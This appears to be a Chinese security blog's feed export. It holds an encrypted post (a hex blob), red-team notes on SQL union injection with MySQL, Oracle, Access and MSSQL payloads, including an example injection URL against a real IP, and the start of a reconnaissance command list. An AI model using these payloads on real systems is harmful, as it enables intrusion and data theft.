e5e16ad1cee698ecc6b22792bb955eff16da4c3f62a0ab8302a2df2ebcaae01b5faf63e8fd65c0766a22487030a2cf6b2d75fbccf81a074e530cb0115c75a4663280fa2c13edeaee8f73021171db9021ed67774b7216dd1db12e84a7ee0214b757868001b8f42b0f16ed5c172bc0d3407d8be85be1709d8bcb842d210bc1235add2e338c199058e426ef66451a704acafec4427bd5e8ec5d0b30a45ac222d08cf9e599a605b8fd3af9c1a8d77512590f8eabc5d715fa92552e4c6ebb783b2461a2b5d84b98b046e8881eaa58709c157365bdb915d066169e8b19f6104cd8449a5660b18f7664d1ef677c74de8af78e3ee62e6b5d5de933f56f4d7a4a07ed55123a4fff64936943fc47b165bc80229e43fc7962142187ae63fa0c4f31f773f1f0a9c8c38811275aae653e0fcf07cd81df1234c8d8a57be8b4a731e38d0530a5c4fb12afc22cd42cdfa5d1624373c1c66526ecafedf1e30779a3130db141f575d982575869cd2016d8cf256e944445a8760438efaa46e4c550dbcd1a40d7ba7d4c9a03795ffe1ee48daa797551abcd54ca42ec6d7ccd5a59adbe32545b3464250da2fc4421f316c3363144143c3d9aaa7ad14bc6a878baf645efd7abec341a19688d5cae05a9674ce9a3416cde1d966bfcc4f3cf45d15487544d5ab7c663ca493d47945229b9bb881aa5074dff1ad2fb385639a2c70dee8b7e11ba2a94634f064e14fa4c31cc0fc0379efe1416452fb001a3f5d86f9ef4bd4d03b5c86ae999610330474227b4bd54203d4c6599be643dff9c25e90c378653a6cecf623f982f3d1cf4c95c76c3782e446ffe23a7c51a8226c379bb4e685051d807c4a4005b26cb214312985cdbed3bea9656ed09c425d4b4f8e485b0f9d945719bb54222932c3289b7b14ba790681800bb6fc8f771d2c11b6780f3aed8ee85122e44cd9c1b1697e5c20c4e1f585447b1ce2aab14f430da4e6d91690f9e05486dec44f9c33e797cb6e635fa67b665822be13812c3a971983ae9f0dc247ccfb12b1e1b7b3c61661eeca5d806c425a272fab310ccc62b3566c1280311d083f3dd46a5db7e21cab52ee4bde86e44a0a7c4ac93ac5498c067257d6008885d2ba4296f504e4c6a674e2c7726c6395a452657dabdf7397b8740d6d095dcaef55d20e6784d2e1770bdff910fa3b58715e4c3c69a2b36c982095330e7adc3733d61af2937252d14598b183442352be14611bf3686460fa7bb01cb2039e055f913a95158c078dd41a03bba1dbb52a5823a2f7e56d2779ef2b82b83ab756153663abdcb4cf8f444b0a3128017bbb77932739324b694d737fa3c398fbe5bdd8096959a19bd863f5c786ad3b84c2431584187609b7d311dd88ee2bfb36a91fc54cf518f4ad0ae17cea7848e4912f3e0f4075bd181ec24446cb0d846bd3982577ca127459ee0c7af23ff57f52599922a3f488d5eff52cf2a177bb223bd0b739c13c152278ec7d04fc096d2407b30a926df0725ed986f46e21ddf7445ac087022f1c692f027e9c497a9972a3b777d8935f8c22a358796b1e4ed5a9350ba53dbd7850e21adac20ea62dc5908d1f241495a48d8384cfe23909b911ebf569fc5578580e0e2a2ad977c81a1879b12adfd10f7a04b239da42e4c24663c851fdd10c6e1a47f84d5c13bca312699413e6ea13d8e30ad613ae695a40d27ce4a130757564f36a7ff3ebda5718e82f6ab34b458a4483933c67dd51451da4cf1d993cafb2d9a8e4b47e09f229825a4def38abd279bd4c3cef7b7e2f0c83d565752214eea1bf12b806aa03d69ec37e6d6282fcb8284240fa5a67217c4eb7afb5b205f84ec93ac6853d61c820ec123f9d437701d11590a27869edfb24f1e852e16f34ca118656ec292a9923916506bd9e0ee4c443ae7754aa468df594d93aab8c235e8c3168a8a9f9e561332f6187d146edddc7d00cf338e011164ce8f70afdfc756cc24ae4a4616008332783266b914228f06b1455dc8eccd98bcb0231e57985d9f64717109e98c812ab5c653614c27a58dc595f908f0db77ff93ded1c2aa0e932ba365a46c376b65d299d2cb82d97dc4eb8d51a8edf007e5077b370747a371bf6a21f4568ffc936cc9ad6827da2090b3f741738f508186aac0fa805bbc7afd4610afe6fa9aff8f21e2b69b89c349966ecb10a324a7fd52339a0d1c939aa9d0b48f931bacdb33136e194b62156c35f9ca92d8de546455f8c05bd18c3c0383f03a61bd8d4b9935b5337fe2dd56c55c4b7a8a4734e203059e28f02630c81e946b2096348309907ee0d9abd164d63b4d7b18a23bd23934448c56aaaaedd504c7ca67b9b74385cbe0c3d9ced43218ba61a214f8a669107e9a813fb73790d398f133fe74ea8f39a1c7f7c44ed333c273a70790a12a8f29ce641ee12f5231660a6e6c5d6121602b14a2fc07fe6ecd7d0d4b0d4f65d970013a743f2ff7198c2011efdfaecd71feb6c45c5b5f31577af78c900c8c8dee53b7ccdfcfcc0c7f503814e17967b282812de6d68915be5bb8023344d4fd5469e24fab1ca23dcb91b682905e8e2faab0ac97a03aba0cdb158d4889e4173e7841595a00f40441c6526a5e77915ad78941d831328c3909f78e230488cccada37b712faf5d8c54703bfe7eb0ef91792837c9a93e074756f363056abcaa2344e8056076692bfdb63b66aa230ee056e94c6aac101bb1dcb414c5643a1e7edf3f6d3feb419bfee6af954b4b6fbf01e9a3ef2706a518eb8ab7b2c86e73540a77ef459153b20fe5110734136a8b2b4ce03fb021289f75af51dfe418ccd44a9b68148e6f1b5df6e06b5cdab2d300384fce9b292529e037fe1d4285c0e515e79020cd6e7c48690f4c1ec9769178413af2959853d8d5912b1c3e029c0db5d761355b7a345643a81d4202410d3ad096019f8ba185e6c13ae4633fcdf8e0fe1829174855977b2b65eed5bb31d062a2ab94e22050248b37e9f593afd5935c0b25b22259dd79b7cb4f7bbc26c950b718cba8f38f372dd54d1466c843f18347ee81a48657ac9aa7348268b90a56a5b6d4e055bdc2f6e53b1958fad5f73cc7bb199799133043ce0806f895683bdef7389fa59cd79a4bd74f953c5123ddd2b27ea866a6254f2b97628f45b7dd98c07d8c1a69b6ac5ef56da5773150ad5d809b39243d53844c532f6273b5323c4736dd3050876ef1e66e6c9e57037b8dc49a0b02dd2cb87c3509d4c024b3515a5e4fc5d3e6e964952c20641dc20927cd13851f60981a56bc95d200bbd77c604d82d0d25db92d39fcd3a3dc678d32a1bff3f761c571846261b9c3457672db2b7d97ccfbba49ea90ff7bc80c4615de0e717d2634188c266533c170720f9e2eeb70354d24c4a23cca0af8ac3fb86dbd6522a852759537c9712fb646f55081d69f497156a1f0f292f98c8611936bcc8deec75ad1d3b11b81e9c12434a727eec566a642ae74b2ed33faff7df3760bc794702d2c4b1fffbe2e2c96a29a39e7bfbb5b369859a542565e8f5f559ad4123d2c77a439e53871440c2e7eadd2051dd42da289bfd78bdacca230c3f9dc032165e8753ae08c747b2d3a41b2c69b2ec27847b49d7b608e834d85c3968224411eb052bade2a652099c89dc0d444e35e43e3f051ad0b5ba7dcfc635655c6c851297be0db73ac903f1e11c34f6c8632456c04a15b496acbe742d352d6321ab74be2ceb5a9971b84e61bb1e632dcdcad63f0a00fa6b3c260e9f9b39888abb05161a7c4c66f3a57e21cf86581e386bb98506fa8af7176720db2b5d7eab77db5e05a68f215178a62e5108361bffff041936f362bf4e8741a4ffcfed2edb9cace5ac2ee88262324f3c69eb6c0d47affb8398a38f4180db8d136658c6c1d6837de865e990f29d98dd98ab51fc89657c80f0c0b321fc59cfa3cac645ff7a362d8f5ff30e4dc08e3abfa7650c02c4e67e117c4bc90f172fdecb40afac59077d3d6f5a42bed33864d906dc9efb5ff3401176ac2120bb7265dde88265a9455c54b4e6b841b333eddf2d53e69b94749824b386b24862c5df08580258993167267f3939e6929543ee86ca05a9e5d382114597f7c47caf7a5bbd96cf5f751f576ab6f1d8d850b5e65f7319a6f90bc9b23e5d9120d507d1d257982bf4b5f1bb6ab8de93635ea331cdf6a2e9d79362ded92280a5289dfb69a54b040e0b862f9b2499bbed192b943a4487dedf529f0cb28a21482363954b54f0cadf01b299bf056aeb2c8312c32cf680a26279fd0e8c8fbf05832854b1b10c4b434f1069e090bbd9e13deb1d175337580fb845eb29bf3f4d61867f4e384ab91a9a9472e6bf7a9fb3faa642b4092d468173c801f5751fd347e2346d98d5e327469aabc9bd7ed883c4fb248a528c8d588f29c60ca66924324b161cdecb99d72ffed29eb5363a82688744934608f6b709a6689aaa20ef9a1a8d31b8fc676962fc6671193ce3df17b0cb048c709e97b1a7b12b43772ea12bf3a7991458cdff4166e9a6ec69a663c46ff75a915f24273adb9848907525f2117cf2931d33a5fa3dfc828d0c1d6722eab8f4904d75b7db5f286944220a4c2413440728f2e8857c59d817430fde9e404f5d7a33d011d7212b10465578598f9d4c78ac3683f9e5d4c9d8d0a25aad10d39a059da5719c33cb3b5981b93b05b6b13e6b547661a2b9f0ae18026d7f9e0b3de26764a30264a31d4d01d6ffd92475ce8bd76e4572c2f00b0c3d0d4dd0646e88258e39d71c25e46362593fc88ace05d56cdace8d69ce9fe65957aea196d1b8ef93fe97b7f7695e3d7f19f648751d7140c2659ed5f10166937b222e77f0cf8be44f035782dc9131f91d4a0efd9072594a9cc08f64664957f5131732a4be0b3ab78a3493c93e413246cd02ff9db6cfded16d05a4ea817d644c920eeaba1fc4f002c580528a497d33c218e55c1973fd5adf493fd3f102c717c14d81a9a20710953b24f3c991a39eab29d5edb9113e56de2706a28b7f9fb495cbadef374cee47a8404076f0dbdccd915935f719a871508ade61915ba646750c6ca1a9812660f07c5f2ffbd6c95680ae703393decee041d8973115c71c16ba2d188db5c6d9780d23467918e5e23dcf245d61396c88dd9f39261b42bdc5ca9a9ac89b5d8888ec197bff6d4201af7990443e13286d52eb07c41ec896ce8951adebe570658f42e8ae58d238b87df2a577a990a9f0c822ef081fa0116432720d86fcf25fa9e6fe677c69ddb1cce47e9f9860815981d2c3ea20af20a42126afb134bbda1061f81f7a9fc536b9a917cda46c6978ef48bcf52aa3f213e4f8fd93625d82f53d2e0eba17db1bc76dab4aed9dd423da79436eda5484d0ee232a4e9ab7553caef7857a4666b9cc58a7c0ea29c76e0b64ef9e4fbb0634efeacf164a560a1ed6b9c5c746cdafa8e29380293c940c84d7d98964627a1669c0a362f20802e23bbcc4edefd8a6772d8530bb1ff392ab858534c29266f0c65064f87d6ed89a754e8f66affc042a3e58bd953858fb432c25757ee3a77256f3dd696f50668bdd1c105169a7a320adc0be119f63b38e9a7da09c5d17524088e0d73fa63c53f43d01f9afee59a1d1ac04b38eec829f6ef43cef7019098689c8c9ea02ae5768881b8770c01392bc4cbdd9d17ffe707fb176761f8beb8653febe9cc00f1552b74a6841147493628c841a9db8707573e66adfa079268bc34bbcda68924d577de3a72a58cf359aefb2099af4945c4307ae24b2e1ef3b57413a3c52067dd9c6176c46122aa969f8a4c5cbdc91e017ad2421e544497a670885e6209a9b0bfd669b02847c25523e8222665a94591ebb8a97a30e84d60e6c9433fde7f1c27d69a849f34f3e056b43ff8846803be2715784b1f770c64c8a1be375bd485bb1dcdefcc7e8dfc799d69e3b40c9bc13dc6cb50a06440d3afce6898a62ff7dc6abb4dda2f96900b71e7f0fbd9270aeb7d88c676444d75d27dec9c42a792106ce9396a88efe6111214f16b7ab4a36c35ab8d193e87468e53a17517f369b96ae1dcae69d797a5a6cc8f2b7e80426a44354b0973b7d66f57f365cbcace5159afd21c853f21a443476a57a20688d1c185e55f7ff325d8fe5b47b5f073d4b436fd5e0130c9fcd864401280e080c416aee7968bebb564d6aef622aaf456681e42e98d6fa096d22a044c7fbe377fd2f8ef4684ba979861bc9135f0804a0404e8e198d5e7adbab8bc44f29ddb2a91d3e87030ec4f02f7f437f5da66cd8fe5fa1633728eda6656322f1464597a8843380eddcedd1d56162e3300be61899354ac4496bb9e678f0c96aa5e9af00aa163bf996f2c60e616de906e441cb6f1f4717c653797e8b77a07ca853dbb7eac7a609c194f7a26fce8ba671d9b35311542e51cbff4d17251ac372cfd4107b608b26e01d5abf7dc849252e1fc27969b436dc6ae980791b7ef6c020c6b48c0aebd4d98636e91d3513b6a0eb5c179543d23682509db1d80a855b317cbea15c63ed9bbc2fc978a8edbf5eab75c3b6c9f6305c4c3cdd65e03984ecbc1c18bf0b83805a74900edf75b8ce4acdb4fc831359c0a4fe95fdb8826e447a2f64dcd91cf98e6cedb1cfbd75c7a80380dbe316e822bbb51dc33a111c1b471a18daea177ca83b69ab87bfca73749d0906802eb83c2449fcfeaed4278f676e60074b4dfc6da1b3d3af98622f477d329bbadcb4a14bad7af2d7e51529171b9a51294113d33a1509ad290057913222afa3d677e028d4baaa4839c06d1a678b5109483d57443ee26c8e835de4effbb916e8b5071b8acd7e4c251b02f3ec43c39d9e5ce9587d0949bac46cef3c86379046ed7a9cd42f69584dbe150d8052b6a24191e112a16ea49236ca49304208a2e377ccc6eb1df5f1cfa0dca89d0a452e473f0b0565e2d720a2035aae6f802236251950ebedb414adf631971a166ff7f20e7e461bad765cb5818e6f9ea3faed3594982689179611147968e5c93dc97acca3ffa8f6ca49956057044b0d01825cad46df97d38abcc10a283d561b8a7bc939d56286f9c59fe46f84a9a1f770e4b8b564c60131734ca19c086238008390670ec01ae8f9bc747a78465095e0f4c6f610b255e04d1762fc9bcbbdacaa540ada6c5313c93fdb58e3e4bdcb4031bdf2dc2bb5691ed193a74393235c7c4a07a80f6e6a7e3d1db52e1c88e64c6ed85a3c44606a0983008448dae9164708d72725f62e8a249ad2c5fa33287bab7966fcc518fbc9630628a14c424f51f363e5c9f602134d7997b1fd2b55f9852eb68e2bbf497c4ade5e145e5049e6a19ff08cb8aedcfea045db7dcd06c2b0eeae553ac812ba831443b8ae8f841b88d1fb8d31371ea4240cc289e095dc81a698c2abf859e667d5d326b8ed7656b26673a8397cb558422ee57a806a62612a7488201e37d762653576a9ed2bee3420297e3f190719e6f06bed71266b71ff21077dcf7c72d988519c9841200f1e3fb36ff287c43af4fa94b3b9b1f8d0859f01fdb190b96c08ec634abb527652dc2ec92858c988787fbbf145c2cee3b69847e9ee0e3f380b3d70b69c21f0ef141feab24ff13aa6b6fdba647ca8e3c9aeba336a077d49a599e08ec731d32ce7b6dedc445f8cd90aed5ea1fbf11ba062d8189ca83d82482bb2f94a0bf58a3e3652c0ba801f1c01f9396bc523e93b97410b98b861308f820e82dc4f5ed26d1d547e0b2ee75d69cc0de1d0d966873ac17fb3a9e6fc21f087746a27259f10baa67adefa90ed358dc72473a9453bf023b7a5ca867ce792d7790d9073f14de12433338cbcb1030aee96b12e49b352a31a462d2fe29c9869d269930fa14ad66abd1ad34413de7c78ca3e919f7e4e31f37995066bafb253252110ad1b9c67d88db8b5b88d8eb442e2aca41bd2e18eb16a8401ea980e533ea6f28bad223b783f74ef3a6f3096cdb4f69439a836c1f41f7074fdf5338c620ad5ec124f6ee4f92fb0382258d91eb2a6722578446acc5e4b37be8831d26eede02732c7715c88f968cfe99e6b27117201a30f99c637c7497bfe51d69b3d976b6476ada0fa8a7675809d7f90a9203358f95fcf9bc12aa488d48c6c82f7b8af83e2ea391eb2ab189afa4d629cd64918bb392381017a4a421ec33ce3d62130c4f806f451585a098e2e229e788a62126fb71a5f01768975b21bc9a7e31aa7b700b95a3153d03015a5609ef3bd4345c354afb113745d98b95a218664d64ef8d9b32ca62db44290c10eebf59d9adf2e5c5f42feb136279c9c29eda4b2e036d04ced64856ea173b05931422299eb051a10123d090fe8e310a860ecbdce74516cd27054470d77c6030ba6af21b2acb0f492c95cdd29bbf2849d0f2793b2ab5b520bffca979f0844c065f5b884098c8c0bf374ef0cfa0e73aa3a48159299f0ebb5369f232f670cfd58a5f644c46603a6ccf6c646b1d233169eaa100e60ed3386e8b2f8c3ffe2276827bc1162ff32404db8335b836d74046f62691f718dc9bba42381ede75d43f759a7067e4a4a3d0abb8a441bad4d93458b424c41ffb67950925b1ebfb3e00d11d29bef5fd99db5acd5205db87498cb15775be5a27dd12af8d160c8985099b277894ee8b65fb0946fa4ad7d62bfeeb0a08871f800d88e264aa19d442b18a9d43e058851d4acd3a4687945fb080e7049a9f5be82cea1d37bc5598b833fd1c003897901e0fc7a51d4986a2e4b071d4706c51b0c32ebbdfdf4a0fb341564d6dbaaff21d84a03505b1a12597730be67829c8fdcb21a03b02a9cac9fbac5455bcd92565129518e5f4fd210d20ca5d9c19cc18a87a79493cc22477b042bca9e3a27de44d051701aa4b7af364c8317aa93b6cf24eff8d4f0eab80a1ad08ed5dc5b9c8b279b7bf0ef4feae6b36000a1a915a93fe94ca29965ad9c24c2713e09bcc916f7d81d2969e1e3e88fbf024a8b9f7b141c80bd1cf0f5213b90af7ddc4c03527b2893b37326343ced3914011c0b84d832ca3f6d2a571d5cffbfb8fcf265267d0ab06a457ce10e54496037fa47d8333c1d482532c3ae5c3192ec54a97e2634dc9af903c1e1013a9d30f571279ece26138477aa136bcf66641091554b45edef13996fd4a6f5b6e64c285a47f3d28de2d5eb806c1f81d3c91ca94d9a6388b37d0904f0f157cc6fe22194d8e7313570d14386162033aefb1cea47e1b0de69d71e01166e4c11018935367904354f2d1f527c6c213f3bf1ed15762320c388af707afaffef38533ad823ac36dbdcd7d982ad34c791b82fcc341a122144e0771b77021627cfaa442a80b380de097720473a3118b50b6b2ee85e6e1ef1b42061f1baeb0f35194f248bfe282372523449a77ce9c0a016274707db5421c745ccc614c59f8a91fd061a558feba25cd9511c9b230d080371ab2afa9d4e5e7efabfabf97da8de60c32420b2fe17a220268b720ebf86b0d5149aa81e210f4c3850b1aceeced5104d6872fa31061b0b23d71ad9044d33d47803d11ee7f602f11fd8e2988c048564427b91c677d19723f9c0f5f020deefd53182ab184f958d9c6bc62495e6e35322f45dc6cb872b24eb2e454bac82c4e8cb2fac72d3f0a7f802fc54036a57ebd9e341d915f16d986b2ba82a2f1ec53e3dfad5cc2f2d6439e125c04ab63ab33f872b53d9b408a4c5d09b2fe49208cba425ec0c5c75b0516e696d721b815bbdd3c122f0d1d7f97fc7f3dd45e70e111baf23195bb89bd5f953d495a2e83a781335c1e1b05bd6b09db52854c3dc054aeb27d19edcef79c83ddb84b3e0ea7c526c693d5b1602048a3adab3c23267b9f3116eaded3e212028df7f35ed923a8ffb5015d2988583792eac869b5f929b9f862c832ae06c4b582cd777f452b8dc7734463153b38ed86a91f16b89208d4c3bc9c9f2b62f002cda377a5999e53e50f30720372daec2cb841bd1f681aacb9dff0e4f4035c338ee77cafde44149f6940573bc96bb2121278699ccdd95c5cd7e59189d40f51a1b897b9c99d105302a932ff526df90075a7645873baf46aca154ce79b778ad6208ce3854b98cb6c162d7b400899195bf027c00051825ba7096e0e4ecb0deae02a7d7dac39ec143e79a537755e1769100d1d2f530a5a73e00dd4ef999d3e262307394bcc41b972a1298c986289ff8cbc911de9480677b7c599d925e9abcc1ec8005b029c22975ea15bc6a330581ea31cfe8111cacf5c4bf25a013266fa2a8ebe0e074e2d53e73cfdb41c7549148888a376798ed5aa163ba4eec94bcba311993e128c7bef2c59cbaad9c416716211666d934176a369eaafff87b1fdf69739c4c2e788795d9e1727785fb1eaec4158bba04e31beee5a1a0c4488c805187261c339674ba6fd70fc0782733c93e350d3820b3a799795027bbddda878676de40517d5c835b9660e4353d385ec02a343e1e0d123135085cee1b2a7d66bc7b559002eccecde2f74648f4bff64dba205dcd90ad3c2de3e5f694dba7af4382d73d81d459129afe561bcf89681117a8000e904ca65a0eb0809e2a0680588309e3d0a1be5d7d99c378e1a8b7956cda7785b74986ed6769d36359671c9fba4b7c861b810a292bcd40a3a71419d2d826d359825baa4a4d2dec4c59e4f908acc23b70d0cb6cd01202532cc6d380baf6515f570b75557c76841de55e4fd7d5fd41d4700b1beacfcd48a3f6dccdbb00d421f84f8d373fed9ad01a89efcfcae72bbfad24136674221e5301c9ed576d74db5009e4d63cd113f9877a05027d867a716a4a5d0c0d28eb2a073601fd25b6a7bdc9c15355bf5858da86048eb17427dbb11b4f9f1b8818a8c8cdb20ab7b41fe450723393ba8b581abdb4c5d2a15cceaf83bdb420761dc3a7466d67a678d311fda131d51fb3a8510d9867f44225d5af78482664ccdec5047fce5c6e391c4f61eb127861681f247ee47a5f6b24c0084f4faa87276d025e80cf168b771fabde5369fc91df2878f64a9f56eb68a7a11c79416bb3e20f35ebcbd075d30c7e8ba72b9c4ddb4486b4a9eac420f69997fc8d0a2435ccf5c846fd7df01e26e32078e1d3d430606d0bf2e96043b22f32c622c2ee3fc2d5600d32712d5c7a1c26137905542feee2c034b337700cf8cfd3207471211ba6fccf1fd488d435a659cc2aae24b58fd04ac0bc77c709d67bd7adddca3d26c0192b5c656b8db5d2eb776ab4638e0210205c37fc7778af78fdd539c60b7a1de6eabc3488832887d2f0caa4b18c14dec6c68bacc9abd35abc97b871027505aacc4c2a36c5032ba4cf1939b3994701d1ccf5d24c133d229357e45ab62a8bb3ea25da91b930cb87ae9137931614570dfd5c93d87dc09944073ea3aa95b4304b7836b9a9b1510e8849d5c79040e30a3741931cae5bf2e002a3251f337733232c4bc6667b5d0a07d45fd1660e222e33ab5dec0df2b0f9b5cf146f3caa7ebf6c3240917cd36d5531310fa3ae757f5cc36dac9bba9e05384f94140c2aec1b88049d702f6ceaef695de9a030b84d6cbd0ab1cd3127474143da216ee9e6152154df6bde2434a5e976afbb8b30ae578b93e555ddfc598a4e22da9b5a8db960126be0655593b907dafec0f1e5162961f82fb2a9f138141d8ac4fa4f1c99363b12f93981f7abc49285c79d97030ae499ff0a70e5afcec310099bdc79a1517145c25d33ec99ac75eecadde7428c4f539c8141c033a6077199e1cabbb48dcde857cac7fe5dc2c98c23185940f6d762d2f66e36335d4f618e504e431d39969e8c0b2d8c1d5a74eed3e87a9264400572c42b633c823ca2c2603179633a41a835bf65656d78edc17bf91db9f4e63b0f409cf470dd7bbbbdcb690cbf2f4279b6537fddbf232c8ad60d079892d13deec945acaaf16c2fe736bfc981010901b048821b3718e8e0dc4daa4db296aec7bb0d1e6f8c26e20e94a711e28888e12a1e78b29e908d67b6ba855a287a3837cf50c0d4c5fae8b98235145606a5cc884e87860815a056eb8756f3898597391ddc7b1157c4698df08078ddef2ab836bfbf7179b7861e33377734bc6232056937172bd2e2fdaec86cd7a5e52
  
    
      
      
        Hey, password is required here.
      
    
  

]]></content>
      <categories>
        <category>红队笔记</category>
      </categories>
      <tags>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入-联合查询总结</title>
    <url>/2021/09/23/SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[联合查询注入利用的条件：页面上有显示位
联合注入的过程：
1、判断注入点2、判断是整型还是字符型3、判断查询列数4、判断显示位5、获取所有数据库名6、获取数据库所有表名7、获取字段名8、获取字段中的数据

数据库判断：1.用@@datadir查看数据库安装目录，能否判断出2.通过各个数据库特有的数据表来判断:
mssql:and (select count(*) from sysobjects)&gt;0 and 1=1Accese:and (select count(*) from msysobjects)&gt;0 and 1=1mysql:and (select count(*) from information_schema.TABLES)&gt;0 and 1=1 oracle:and (select count(*) from sys.user_tables)&gt;0 and 1=1

终极法宝 ：报错信息！！！！！！！！！！
mysql注入注入判断：
&#x27;&quot;And 1=1ord(0x1)&gt; \\/#--+-^1^0

字段数判断：
Order by 3 --

获取所有数据库名：
select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA

获取表名：
Union select table_name from information_schema.tables where table_schema=database() --

获取字段名：
Union select column_name from information_schema.columns where table_schema=table_name -

查询数据:
union select 1,group_concat(concat_ws(char(32,58,32),first_name,password))  from users --

内置函数：
拆解数据库名：database() 用户名：user() 版本：version() 或 @@version数据库路径：@@datadir

mysql通过information_schema这个表查询相应的数据库名，表名，字段名。
oracle注入获取数据库所有用户：
SELECT username FROM all_users;SELECT name FROM sys.user$; -- 需要高权限

获取当前数据库用户：
SELECT user FROM dual;

字段数判断：
order by 3 --and 1=2 union select null,null,null from dual--

判断子段的数据类型：
and 1=2 union select &#x27;null&#x27;,null,null from dual--  //返回正常，则第一个字段是字符型，返回错误，为字符型，返回错误，为字符型

数据库信息：
and 1=2 union select null,(select banner from sys.v_$version where rownum=1),null from dual--  //探测数据库版本信息

查询表名：
and 1=2 union select null,(select table_name from user_tables where rownum=1),null from dual--  //查询第一个表名and 1=2 union select null,(select table_name from user_tables where rownum=1 and table_name&lt;&gt;&#x27;STUDENT&#x27;),null from dual--  //第二个表名

查询字段名：
and 1=2 union select null,(select column_name from user_tab_columns where table_name=&#x27;[表名]&#x27; and rownum=1),null from dual-- //查看第一个字段名and 1=2 union select null,(select column_name from user_tab_columns where table_name=&#x27;[表名]&#x27; and rownum=1 and column_name&lt;&gt;&#x27;[第一个字段名]&#x27;),null from dual-- //查看第二个字段名and 1=2 union select null,(select column_name from user_tab_columns where table_name=&#x27;[表名]&#x27; and rownum=1 and column_name&lt;&gt;&#x27;[第一个字段名]&#x27; and column_name&lt;&gt;&#x27;[第二个字段名名]&#x27;),null from dual-- //查看第三个字段名

查数据：
and 1=2 union select id,name,pass from student where id=1--  //查看数据wmsys.wm_concat()等同于MySQL中的group_concat()，在11gr2和12C上已经抛弃，可以用LISTAGG()替代

如果字符集不匹配：则需要进行字符集转换：
cast(&#x27;&#x27; as nvarchar2(10))

栗子：
http://59.63.200.79:8808/?id=-1%20union%20all%20select%20NULL,NULL,cast((select%20table_name%20from%20user_tables%20where%20rownum=1)%20as%20nvarchar2(10)),1%20from%20dual--%20-

注意点1.Oracle 在使用union 查询的跟Mysql不一样Mysql里面我用1,2,3,4就能占位，而在Oracle里面有比较严格的类型要求。也就是说你union select的要和前面的字段类型一样，我们可以用null来代替站位。
2.Oracle和mysql不一样，分页中没有limit，而是使用三层查询嵌套的方式实现分页(查询第一条数据“&gt;&#x3D;0&lt;&#x3D;1”) 
例如:
SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM &lt;= 1 ) WHERE RN &gt;= 0

3.Oracle的单行注释符号是–，多行注释符号&#x2F;**&#x2F;
Acess数据注入判断字段：
order by 1 --+-

判断表：
联合查询表，回显正常即为表存在，反之为不存在。
Union select * from 表名   或  表名还可以使用这种方法来猜表名，and 0&lt;&gt;(select count(*) from 表名) 

列名也只能靠猜，如果猜不到就只能使用偏移注入来碰运气了
and exists (select admin from admin)and exists (select count(列名) from 表名)

爆字段内容：
爆字段内容要分两步，先猜长度，再猜内容猜长度。and (select len(admin) from admin)&#x3D;5，如果正确则回显正常。
猜内容，一个一个字段的猜，和盲注一样的道理。and (select asc(mid(admin,1,1)) from admin)&gt;95,
and (select top 1 asc(mid(列名,列数N,1)) from 表名) &gt; xtop后的数字为该列的第N行，x为ASCII码，列数N就是在这一列中的第几个数字asc()仍然还是转换为ascii码的函数，mid(admin,1,1)则为截取admin字段内容的第一个字符的一个字符，也就为第一个字符。

MSSQL注入查询当前的用户数据信息：
?id=1 having 1=1--+-

猜表名：
?id=1 and exists(select * from tablename)?id=1 and (Select Count(*) from [表名])&gt;0

猜字段：
?id=1 and (Select Count(字段名) from 表名)&gt;0

爆当前表中的列：
?id=1 group by admin.username having 1=1–-+-

猜字段中记录长度：
?id=1 and (select top 1 len(字段名) from 表名)&gt;0

猜字段中的ascii值：
?id=1 and (select top 1 asc(mid(字段名,1,1)) from 表名)&gt;0 access?id=1 and (select top 1 unicode(substring(字段名,1,1)) from 数据库名)&gt;0

查数据：
UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = &#x27;tablename&#x27;)

测试权限结构（mssql）：
· ?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘sysadmin’));–· ?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘serveradmin’));–· ?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘setupadmin’));–· ?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘securityadmin’));–· ?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘diskadmin’));–· ?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘bulkadmin’));–· ?id=1 and 1=(SELECT IS_MEMBER(‘db_owner’));–

mssql内置函数：
· ?id=1 and (select @@version)&gt;0　　　获得Windows的版本号· ?id=1 and user_name()=’dbo’　　　　 判断当前系统的连接用户是不是sa· ?id=1 and (select user_name())&gt;0　　爆当前系统的连接用户· ?id=1 and (select db_name())&gt;0　　　得到当前连接的数据库]]></content>
      <categories>
        <category>红队笔记</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透-信息收集</title>
    <url>/2021/09/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[
前言：内网渗透的本质，是信息收集！信息收集这一环节其实贯穿了整个内网渗透！

01-立足点：Foothold，就是我们拿到内网中一台主机权限，作为内网渗透的突破口，我们所有的操作，包括流量转发，端口扫描，漏扫等操作，都会利用此主机为我们搭桥铺路，为以后的内网横向打下坚实的基础。
02-立足点的信息收集立足点信息收集包括：OS、权限、内网IP段、杀软、端口、服务、补丁更新频率、网络连接、共享、会话等

注：如果是域内主机，OS、应用软件、补丁、服务、杀软这些一般都是批量安装的。

前方干货来袭,注意注意！
1.查询网络配置命令：Windows:ipconfig /allLinux:    ifconfig /allcat /etc/resolv.confcat /etc/sysconfig/networkcat /etc/networks

2.查询操作系统及软件的信息1）查看操作系统和版本信息
windows:systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;//适用于英文的操作系统，中文的：systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;&#x27;    Linux:    查看服务器版本信息：Cat /etc/issueCat /etc/*-releaseCat /etc/lsb-release #基于debianCat /etc/radhat-release #基于redhat查看内核版本信息：Cat /proc/vesionUname -aUname -mrsRpm -q kernelDmesg | grep linuxLs /boot | grep vmlinuz-

2）查看系统体系结构
